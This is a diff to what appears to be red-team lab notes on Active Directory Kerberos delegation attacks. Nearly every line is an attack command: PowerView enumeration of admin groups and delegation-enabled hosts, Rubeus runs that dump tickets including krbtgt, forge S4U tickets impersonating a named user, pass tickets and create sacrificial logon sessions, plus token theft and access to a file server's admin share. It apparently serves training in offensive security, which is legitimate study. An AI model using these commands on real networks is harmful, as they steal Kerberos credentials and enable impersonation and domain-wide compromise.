@@ -26,6 +26,7 @@ powershell Get-DomainGroupMember -identity 'Workstation Admins' -recurse | selec
 powershell Get-DomainGroupMember -identity 'Helpdesk\Admins' -recurse | select -exp membername  
 powershell Get-DomainOU -GPLink '{66465373-16CB-4F96-BD3A-12AE7D2C2371}' | % {Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname}
 powershell Find-DomainUserLocation -userIdentity 'Workstation\Admins'  
+
 execute-assembly C:\Users\Public\Rubeus.exe triage
 execute-assembly C:\Users\Public\Rubeus.exe dump /luid:0x1c6be # krbtgt/insomnia.ninja along with LUID
 execute-assembly C:\Users\Public\Rubeus.exe dump /service:krbtgt
@@ -33,24 +34,17 @@ execute-assembly C:\Users\Public\Rubeus.exe createnetonly /program:C:\Windows\Sy
 execute-assembly C:\Users\Public\Rubeus.exe ptt /luid:0x21d8e17 /ticket:[...snip...]
 steal_token 4652
 ```
-```
-execute-assembly C:\Users\Public\Rubeus.exe triage
-execute-assembly C:\Users\Public\Rubeus.exe dump /luid:0x1f5d5  
-execute-assembly C:\Users\Public\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
-execute-assembly C:\Users\Public\Rubeus.exe ptt /luid:0x686cf9 /ticket:
-```
-
 ### Constrained Delegation
 constrained delegation takes it a step further by allowing you to configure which services an account can be delegated to.it limits delegation to a specified list, rather than allowing delegation to any service as in unconstrained delegation.
 ```
 powershell Get-DomainComputer -TrustedToAuth -Properties DnsHostName, MSDS-AllowedToDelegateTo
 powershell Get-DomainComputer web-2.cyberbotic.io | select -exp msds-AllowedToDelegateTo 
 powershell Get-DomainComputer -TrustedToAuth | select -exp dnshostname 
-Rubeus dump /service:krbtgt
-Rubeus s4u /impersonateuser:n.glover /msdsspn:cifs/fs-1.cyberbotic.io /ticket:[...snip...]
-Rubeus createnetonly /program:C:\Windows\System32\cmd.exe
-Rubeus ptt /luid:0x239b995 /ticket:[...snip...]
-ImpersonateProcess 3420
+execute-assembly C:\Users\Public\Rubeus.exe dump /service:krbtgt
+execute-assembly C:\Users\Public\Rubeus.exe s4u /impersonateuser:n.glover /msdsspn:cifs/fs-1.cyberbotic.io /ticket:[...snip...]
+execute-assembly C:\Users\Public\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
+execute-assembly C:\Users\Public\Rubeus.exe ptt /luid:0x239b995 /ticket:[...snip...]
+steal_token 3420
 ls \\fs-1.cyberbotic.io\c$
 ```
 
